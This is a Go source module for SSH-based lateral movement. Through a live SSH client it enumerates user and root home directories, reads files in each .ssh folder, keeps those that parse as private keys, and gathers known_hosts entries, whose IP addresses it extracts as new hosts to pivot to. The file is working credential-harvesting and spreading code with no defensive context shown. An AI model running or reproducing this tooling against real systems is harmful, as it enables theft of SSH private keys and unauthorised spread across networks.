package moudle

import (
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"log"
	"path"
	"regexp"
	"strings"
)

type PkInfo struct {
	Pkpath  []string
	Pkvalue []string
}

type IpInfo struct {
	Ip   string
	Port int
}

type SshInfo struct {
	IpInfo
	Source         string
	TargetUsername string
	PkPath         string
}

var PkInfolist PkInfo
var UserList = []string{"root"}
var SshPath = make(map[string]SshInfo)

func FindHomeDir(client *ssh.Client, sshtemplate string) (homedir []string) {
	rootdir, _ := RunCommand(client, sshtemplate+"ls -d /home/*/")
	rootsub := strings.Split(rootdir, "\n")
	for _, i := range rootsub {
		if i == "." || i == ".." || i == "" {
			continue
		}
		homedir = append(homedir, i)
	}
	homedir = append(homedir, "/root/")
	return homedir
}

func FindSSHDir(client *ssh.Client, homedir []string, sshtemplate string) (khlist, username []string, pklist PkInfo) {

	var sshdir, sshinfo string

	for _, dir := range homedir {
		sshdir = dir + ".ssh"
		sshinfo, _ = RunCommand(client, "ls "+sshdir)
		if sshinfo != "" {
			if !strings.Contains(dir, "root") {
				curusername := dir[6 : len(dir)-1]
				username = append(username, curusername)
			}
			sshinfolist := strings.Split(sshinfo, "\n")
			for _, info := range sshinfolist {
				if info != "" && info != "authorized_keys" {
					infoext := path.Ext(info)
					if infoext == "" {
						if info == "known_hosts" {
							catit, _ := RunCommand(client, "cat "+sshdir+"/known_hosts")
							khlist = append(khlist, catit)
						} else {
							catit, _ := RunCommand(client, "cat "+sshdir+"/"+info)
							_, err := ssh.ParsePrivateKey([]byte(catit))
							if err == nil {
								pklist.Pkvalue = append(pklist.Pkvalue, catit)
								pklist.Pkpath = append(pklist.Pkpath, sshdir+"/"+info)
							}
						}
					}
				}
			}
		}
	}
	return khlist, username, pklist
}

func RunCommand(client *ssh.Client, cmd string) (result string, err error) {
	session, err := client.NewSession()

	if err != nil {
		return "", err
	}
	defer session.Close()
	res, errRet := session.CombinedOutput(cmd)
	if errRet != nil {
		return "", errRet
	}
	return string(res), nil
}

func PublicKeyAuthFunc(kPath string) ssh.AuthMethod {

	key, err := ioutil.ReadFile(kPath)
	if err != nil {
		log.Fatal("ssh key file read failed", err)
	}
	// Create the Signer for this private key.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		log.Fatal("ssh key signer failed", err)
	}
	return ssh.PublicKeys(signer)
}

func HandleKnownHosts(kn string) (knhostlist []string) {
	knlist := strings.Split(kn, "\n")
	ipReg, _ := regexp.Compile(`((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))`)

	for _, info := range knlist {
		if info == "" {
			continue
		}
		infolist := strings.Split(info, "\n")
		ipinfo := infolist[0]
		match := ipReg.Find([]byte(ipinfo))
		if string(match) == "127.0.0.1" {
			continue
		}
		if _, ok := SshPath[string(match)]; ok {
			continue
		}
		knhostlist = append(knhostlist, string(match))

	}
	return knhostlist
}

func RemoveDuplicateElement(infos []string) []string {
	result := make([]string, 0, len(infos))
	temp := map[string]struct{}{}
	for _, item := range infos {
		if _, ok := temp[item]; !ok {
			temp[item] = struct{}{}
			result = append(result, item)
		}
	}
	return result
}
